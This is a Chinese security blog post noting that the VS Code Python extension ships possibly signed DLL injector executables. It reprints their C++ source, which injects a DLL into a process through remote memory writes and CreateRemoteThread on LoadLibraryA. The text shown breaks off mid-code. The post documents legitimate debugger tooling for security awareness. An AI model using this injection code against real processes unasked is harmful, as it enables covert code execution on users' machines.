<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>VsCode扩展中的DLL注入器 - 倾旋的博客</title><meta name=theme-color><meta name=description content='
💡 VSCode是一款由微软开发的免费且开源的代码编辑器，支持多种编程语言，可通过安装扩展包来进一步扩展其功能。VSCode的扩展包具有丰富的功能，包括但不限于代码片段、自动完成、调试工具、主题等。用户可以轻松地在VSCode中安装、管理和使用扩展包，以满足个人的编程需求。

安装完毕Python调试扩展后，会在扩展目录中生成一些文件：


其中以下两个文件是DLL注入器，分别对应X86和X64位操作系统：

inject_dll_x86.exe
inject_dll_amd64.exe

在windows文件夹中还保留了注入器的源代码：


路径：C:\Users\Administrator\.vscode\extensions\ms-python.python-2022.20.2\pythonFiles\lib\python\debugpy\_vendored\pydevd\pydevd_attach_to_process\windows
// inject_dll.cpp
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <tchar.h>
#include <tlhelp32.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")

// Helper to free data when we leave the scope.
class DataToFree {
public:
    HANDLE hProcess;
    HANDLE snapshotHandle;
    
    LPVOID remoteMemoryAddr;
    int remoteMemorySize;
    
    DataToFree(){
        this->hProcess = nullptr;
        this->snapshotHandle = nullptr;
        
        this->remoteMemoryAddr = nullptr;
        this->remoteMemorySize = 0;
    }
    
    ~DataToFree() {
        if(this->hProcess != nullptr){
            
            if(this->remoteMemoryAddr != nullptr && this->remoteMemorySize != 0){
                VirtualFreeEx(this->hProcess, this->remoteMemoryAddr, this->remoteMemorySize, MEM_RELEASE);
                this->remoteMemoryAddr = nullptr;
                this->remoteMemorySize = 0;
            }
            
            CloseHandle(this->hProcess);
            this->hProcess = nullptr;
        }

        if(this->snapshotHandle != nullptr){
            CloseHandle(this->snapshotHandle);
            this->snapshotHandle = nullptr;
        }
    }
};

/**
 * All we do here is load a dll in a remote program (in a remote thread).
 *
 * Arguments must be the pid and the dll name to run.
 *
 * i.e.: inject_dll.exe <pid> <dll path>
 */
int wmain( int argc, wchar_t *argv[ ], wchar_t *envp[ ] )
{
    std::cout << "Running executable to inject dll." << std::endl;
    
    // Helper to clear resources.
    DataToFree dataToFree;
    
    if(argc != 3){
        std::cout << "Expected 2 arguments (pid, dll name)." << std::endl;
        return 1;
    }
 
    const int pid = _wtoi(argv[1]);
    if(pid == 0){
        std::cout << "Invalid pid." << std::endl;
        return 2;
    }
    
    const int MAX_PATH_SIZE_PADDED = MAX_PATH + 1;
    char dllPath[MAX_PATH_SIZE_PADDED];
    memset(&amp;dllPath[0], &#39;\0&#39;, MAX_PATH_SIZE_PADDED);
    size_t pathLen = 0;
    wcstombs_s(&amp;pathLen, dllPath, argv[2], MAX_PATH);
    
    const bool inheritable = false;
    const HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, inheritable, pid);
    if(hProcess == nullptr || hProcess == INVALID_HANDLE_VALUE){
        std::cout << "Unable to open process with pid: " << pid << ". Error code: " << GetLastError() << "." << std::endl;
        return 3;
    }
    dataToFree.hProcess = hProcess;
    std::cout << "OpenProcess with pid: " << pid << std::endl;
    
    const LPVOID remoteMemoryAddr = VirtualAllocEx(hProcess, nullptr, MAX_PATH_SIZE_PADDED, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(remoteMemoryAddr == nullptr){
        std::cout << "Error. Unable to allocate memory in pid: " << pid << ". Error code: " << GetLastError() << "." << std::endl;
        return 4;
    }
    dataToFree.remoteMemorySize = MAX_PATH_SIZE_PADDED;
    dataToFree.remoteMemoryAddr = remoteMemoryAddr;
    
    std::cout << "VirtualAllocEx in pid: " << pid << std::endl;
    
    const bool written = WriteProcessMemory(hProcess, remoteMemoryAddr, dllPath, pathLen, nullptr);
    if(!written){
        std::cout << "Error. Unable to write to memory in pid: " << pid << ". Error code: " << GetLastError() << "." << std::endl;
        return 5;
    }
    std::cout << "WriteProcessMemory in pid: " << pid << std::endl;
    
    const LPVOID loadLibraryAddress = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if(loadLibraryAddress == nullptr){
        std::cout << "Error. Unable to get LoadLibraryA address. Error code: " << GetLastError() << "." << std::endl;
        return 6;
    }
    std::cout << "loadLibraryAddress: " << pid << std::endl;
    
    const HANDLE remoteThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE) loadLibraryAddress, remoteMemoryAddr, 0, nullptr);
    if (remoteThread == nullptr) {
        std::cout << "Error. Unable to CreateRemoteThread. Error code: " << GetLastError() << "." << std::endl;
        return 7;
    }
    
    // We wait for the load to finish before proceeding to get the function to actually do the attach.
    std::cout << "Waiting for LoadLibraryA to complete." << std::endl;
    DWORD result = WaitForSingleObject(remoteThread, 5 * 1000);
    
    if(result == WAIT_TIMEOUT) {
        std::cout << "WaitForSingleObject(LoadLibraryA thread) timed out." << std::endl;
        return 8;
        
    } else if(result == WAIT_FAILED) {
        std::cout << "WaitForSingleObject(LoadLibraryA thread) failed. Error code: " << GetLastError() << "." << std::endl;
        return 9;
    }
    
    std::cout << "Ok, finished dll injection." << std::endl;
    return 0;
}
签名情况：'><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="VsCode扩展中的DLL注入器"><meta itemprop=description content="早上 @Akkuman 说看到Vsocde中的扩展目录中有疑似签名过的DLL注入器，遂记录一下。"><meta itemprop=datePublished content="2023-09-08T00:00:00+00:00"><meta itemprop=dateModified content="2023-09-08T00:00:00+00:00"><meta itemprop=wordCount content="601"><meta itemprop=keywords content="Vscode"><meta property="og:url" content="https://payloads.online/archivers/2023-09-08/vscode-dll/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="VsCode扩展中的DLL注入器"><meta property="og:description" content="早上 @Akkuman 说看到Vsocde中的扩展目录中有疑似签名过的DLL注入器，遂记录一下。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-08T00:00:00+00:00"><meta property="article:modified_time" content="2023-09-08T00:00:00+00:00"><meta property="article:tag" content="Vscode"><meta name=twitter:card content="summary"><meta name=twitter:title content="VsCode扩展中的DLL注入器"><meta name=twitter:description content="早上 @Akkuman 说看到Vsocde中的扩展目录中有疑似签名过的DLL注入器，遂记录一下。"><link rel=canonical href=https://payloads.online/archivers/2023-09-08/vscode-dll/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">VsCode扩展中的DLL注入器</h1><div class="text-xs antialiased opacity-60"><time>Sep 8, 2023</time><span class=mx-1>&#183;</span>
<span>倾旋</span></div></header><section><aside>💡 VSCode是一款由微软开发的免费且开源的代码编辑器，支持多种编程语言，可通过安装扩展包来进一步扩展其功能。VSCode的扩展包具有丰富的功能，包括但不限于代码片段、自动完成、调试工具、主题等。用户可以轻松地在VSCode中安装、管理和使用扩展包，以满足个人的编程需求。</aside><p>安装完毕Python调试扩展后，会在扩展目录中生成一些文件：</p><p><img src=https://images.payloads.online/2024-07-29-1ac07f2ccf6b6ba8768b96e62815f150289ca24887a111685646538b567130d5.png alt=0></p><p><img src=https://images.payloads.online/2024-07-29-8ba004d0a43efcfa27809998a10469e46d3e380ea3ed0c3122c60583d5a0ee6b.png alt=1></p><p>其中以下两个文件是DLL注入器，分别对应X86和X64位操作系统：</p><ul><li>inject_dll_x86.exe</li><li>inject_dll_amd64.exe</li></ul><p>在windows文件夹中还保留了注入器的源代码：</p><p><img src=https://images.payloads.online/2024-07-29-03d06e145c8996fcbaafefa67c5c28df4b4f53a9f77b69a21cfefebd0fea9d28.png alt=2></p><blockquote><p>路径：<code>C:\Users\Administrator\.vscode\extensions\ms-python.python-2022.20.2\pythonFiles\lib\python\debugpy\_vendored\pydevd\pydevd_attach_to_process\windows</code></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// inject_dll.cpp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;conio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;tchar.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;tlhelp32.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib, &#34;kernel32.lib&#34;)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib, &#34;user32.lib&#34;)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Helper to free data when we leave the scope.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>DataToFree</span> {
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    HANDLE hProcess;
</span></span><span style=display:flex><span>    HANDLE snapshotHandle;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    LPVOID remoteMemoryAddr;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> remoteMemorySize;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    DataToFree(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>hProcess <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>snapshotHandle <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemoryAddr <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemorySize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#f92672>~</span>DataToFree() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>hProcess <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nullptr</span>){
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemoryAddr <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nullptr</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemorySize <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>                VirtualFreeEx(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>hProcess, <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemoryAddr, <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemorySize, MEM_RELEASE);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemoryAddr <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemorySize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            CloseHandle(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>hProcess);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>hProcess <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>snapshotHandle <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nullptr</span>){
</span></span><span style=display:flex><span>            CloseHandle(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>snapshotHandle);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>snapshotHandle <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/**
</span></span></span><span style=display:flex><span><span style=color:#75715e> * All we do here is load a dll in a remote program (in a remote thread).
</span></span></span><span style=display:flex><span><span style=color:#75715e> *
</span></span></span><span style=display:flex><span><span style=color:#75715e> * Arguments must be the pid and the dll name to run.
</span></span></span><span style=display:flex><span><span style=color:#75715e> *
</span></span></span><span style=display:flex><span><span style=color:#75715e> * i.e.: inject_dll.exe &lt;pid&gt; &lt;dll path&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>wmain</span>( <span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>wchar_t</span> <span style=color:#f92672>*</span>argv[ ], <span style=color:#66d9ef>wchar_t</span> <span style=color:#f92672>*</span>envp[ ] )
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Running executable to inject dll.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Helper to clear resources.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    DataToFree dataToFree;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>3</span>){
</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Expected 2 arguments (pid, dll name).&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>int</span> pid <span style=color:#f92672>=</span> _wtoi(argv[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(pid <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Invalid pid.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>int</span> MAX_PATH_SIZE_PADDED <span style=color:#f92672>=</span> MAX_PATH <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> dllPath[MAX_PATH_SIZE_PADDED];
</span></span><span style=display:flex><span>    memset(<span style=color:#f92672>&amp;</span>dllPath[<span style=color:#ae81ff>0</span>], <span style=color:#e6db74>&#39;\0&#39;</span>, MAX_PATH_SIZE_PADDED);
</span></span><span style=display:flex><span>    size_t pathLen <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    wcstombs_s(<span style=color:#f92672>&amp;</span>pathLen, dllPath, argv[<span style=color:#ae81ff>2</span>], MAX_PATH);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>bool</span> inheritable <span style=color:#f92672>=</span> false;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> HANDLE hProcess <span style=color:#f92672>=</span> OpenProcess(PROCESS_VM_OPERATION <span style=color:#f92672>|</span> PROCESS_CREATE_THREAD <span style=color:#f92672>|</span> PROCESS_VM_READ <span style=color:#f92672>|</span> PROCESS_VM_WRITE <span style=color:#f92672>|</span> PROCESS_QUERY_INFORMATION, inheritable, pid);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(hProcess <span style=color:#f92672>==</span> <span style=color:#66d9ef>nullptr</span> <span style=color:#f92672>||</span> hProcess <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE){
</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Unable to open process with pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    dataToFree.hProcess <span style=color:#f92672>=</span> hProcess;
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;OpenProcess with pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> LPVOID remoteMemoryAddr <span style=color:#f92672>=</span> VirtualAllocEx(hProcess, <span style=color:#66d9ef>nullptr</span>, MAX_PATH_SIZE_PADDED, MEM_RESERVE <span style=color:#f92672>|</span> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(remoteMemoryAddr <span style=color:#f92672>==</span> <span style=color:#66d9ef>nullptr</span>){
</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Error. Unable to allocate memory in pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>4</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    dataToFree.remoteMemorySize <span style=color:#f92672>=</span> MAX_PATH_SIZE_PADDED;
</span></span><span style=display:flex><span>    dataToFree.remoteMemoryAddr <span style=color:#f92672>=</span> remoteMemoryAddr;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;VirtualAllocEx in pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>bool</span> written <span style=color:#f92672>=</span> WriteProcessMemory(hProcess, remoteMemoryAddr, dllPath, pathLen, <span style=color:#66d9ef>nullptr</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>written){
</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Error. Unable to write to memory in pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>5</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;WriteProcessMemory in pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> LPVOID loadLibraryAddress <span style=color:#f92672>=</span> (LPVOID) GetProcAddress(GetModuleHandle(<span style=color:#e6db74>&#34;kernel32.dll&#34;</span>), <span style=color:#e6db74>&#34;LoadLibraryA&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(loadLibraryAddress <span style=color:#f92672>==</span> <span style=color:#66d9ef>nullptr</span>){
</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Error. Unable to get LoadLibraryA address. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>6</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;loadLibraryAddress: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> HANDLE remoteThread <span style=color:#f92672>=</span> CreateRemoteThread(hProcess, <span style=color:#66d9ef>nullptr</span>, <span style=color:#ae81ff>0</span>, (LPTHREAD_START_ROUTINE) loadLibraryAddress, remoteMemoryAddr, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>nullptr</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (remoteThread <span style=color:#f92672>==</span> <span style=color:#66d9ef>nullptr</span>) {
</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Error. Unable to CreateRemoteThread. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>7</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// We wait for the load to finish before proceeding to get the function to actually do the attach.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Waiting for LoadLibraryA to complete.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    DWORD result <span style=color:#f92672>=</span> WaitForSingleObject(remoteThread, <span style=color:#ae81ff>5</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span>);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(result <span style=color:#f92672>==</span> WAIT_TIMEOUT) {
</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;WaitForSingleObject(LoadLibraryA thread) timed out.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>8</span>;
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(result <span style=color:#f92672>==</span> WAIT_FAILED) {
